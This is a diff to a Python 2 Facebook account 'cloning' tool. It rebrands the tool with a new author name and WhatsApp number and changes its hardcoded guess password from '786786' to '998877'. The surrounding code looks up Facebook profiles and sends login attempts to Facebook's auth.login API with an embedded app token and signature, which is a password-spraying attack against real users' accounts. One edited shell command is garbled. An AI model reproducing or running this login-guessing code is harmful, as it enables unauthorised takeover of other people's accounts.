@@ -72,9 +72,9 @@ logo='''
 
 \033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 
-\033[1;91m☞ Auther     : B4_BALOCH_M4_MASTER
-\033[1;92m☞ WhatsApp   : 03232132362
-\033[1;95m☞ YouTube    : https://www.youtube.com/channel/UCAGKWM8EwDFZ9sP8CdJhGBA
+\033[1;91m☞ Auther     : fazal3344 
+\033[1;92m☞ WhatsApp   : 03052600088
+\033[1;95m☞ YouTube    : https://
 
 \033[1;93m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                 '''
@@ -146,8 +146,8 @@ def menu():
 	print (S + 50*'-')
 	print
 	print (S + '[' + P + '☞1' + S + ']' + S + ' Fast Cloning New Update')
-	print (S + '[' + P + '☞2' + S + ']' + S + ' Update B4_BALOCH Tool')
-	print (S + '[' + P + '☞3' + S + ']' + S + ' B4_BALOCH WhatsApp Group')
+	print (S + '[' + P + '☞2' + S + ']' + S + ' fazal 3344Tool')
+	print (S + '[' + P + '☞3' + S + ']' + S + ' fazal WhatsApp Group')
 	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out')
 	print (S + '[' + Y + '☞0' + S + ']' + R + ' Exit')
 	print
@@ -179,15 +179,15 @@ def mb():
 	    psb('☆☆☆☆☆☆☆☆☆90%')
 	    psb('☆☆☆☆☆☆☆☆☆☆100%')
 	    psb('Frends login new Account✓')
-	    psb('WhatsApp Num 03232132362✓')
+	    psb('WhatsApp Num 03052600088✓')
 	    psb('WellCome To B4_BALOCH')
 	    psb('Congratulations B4_BALOCH Tool Has Been Updated Successfully')
-	    psb('🔓User Name☆ 786786✓')
-	    psb('🔓Password ☆ 786786✓')
+	    psb('🔓User Name☆ 998877✓')
+	    psb('🔓Password ☆ 998877✓')
 	    psb('Subscrib My Youtube Channel B4 BALOCH M4 MASTER✓')
 	    psb('Please Login Again')
 	    time.sleep(2)
-	    os.system('cd $HOME/B4_BALOCH && python2 B4.py')
+	    os.system('cd $HOMEfazal3 44&& python2 B4.py')
 	elif bm =='3':
 	    os.system('xdg-open https://chat.whatsapp.com/BcmyQPBz6lz3t6oVN8wLoi')
 	    menu()
@@ -280,7 +280,7 @@ def pb():
 		try:
 			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
 			j=json.loads(h.text)
-			ps1=('786786')
+			ps1=('998877')
 			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			k=json.load(dt)
 			if 'www.facebook.com' in k['error_msg']:
